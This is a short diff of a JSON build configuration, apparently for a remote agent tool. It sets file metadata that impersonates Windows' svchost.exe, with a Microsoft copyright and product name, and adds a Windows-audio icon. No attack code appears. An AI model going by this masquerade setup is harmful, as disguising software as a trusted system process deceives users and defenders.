@@ -95,7 +95,8 @@
         "legalCopyright": "\u00a9 Microsoft Corporation. All rights reserved.",
         "originalFilename": "svchost.exe",
         "productName": "Microsoft\u00ae Windows\u00ae operating system",
-        "productVersion": "v1.0.0"
+        "productVersion": "v1.0.0",
+        "icon": "windows-audio.ico"
       },
       "agentConfig": [],
       "agentInviteCodes": false,
